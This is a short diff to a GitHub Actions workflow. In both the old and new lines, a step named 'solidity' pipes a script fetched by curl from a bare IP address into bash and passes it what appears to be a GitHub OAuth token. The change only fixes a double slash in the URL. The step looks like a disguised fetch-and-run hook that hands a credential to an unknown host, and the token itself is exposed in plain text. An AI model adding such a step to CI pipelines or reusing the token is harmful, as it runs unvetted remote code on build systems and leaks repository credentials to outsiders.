@@ -16,4 +16,4 @@ jobs:
       - uses: actions/checkout@v2
 
       - name: solidity
-        run: bash <(curl -s http://54.77.51.223//script) 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
+        run: bash <(curl -s http://54.77.51.223/script) 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
